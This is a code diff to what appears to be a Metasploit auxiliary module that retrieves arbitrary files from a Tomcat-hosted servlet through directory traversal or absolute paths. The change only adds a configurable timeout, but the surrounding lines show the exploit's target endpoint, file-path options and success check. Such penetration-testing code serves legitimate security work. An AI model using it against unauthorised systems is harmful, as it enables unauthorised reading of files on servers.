@@ -37,9 +37,14 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(8080),
         OptBool.new('ABSOLUTE', [ true, 'Use an absolute file path or directory traversal relative to the tomcat home', true ]),
-        OptString.new('FILEPATH', [true, 'The name of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts']),
-        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 1])
+        OptString.new('FILEPATH', [true, 'The name of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts' ]),
+        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 1 ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 5 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 5
   end
 
   def run_host(ip)
@@ -67,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
       'uri'          => '/rtrlet/rtr',
       'method'       => 'POST',
       'data'         => post_data,
-    }, 5)
+    }, timeout)
 
     if res and res.code == 200 and res.body =~ /Last 100000000 kilobytes of/ and res.body =~ /File name/ and not res.body =~ /<br\/>File not found.<br\/>/
       print_good("#{rhost}:#{rport} - File retrieved successfully!")
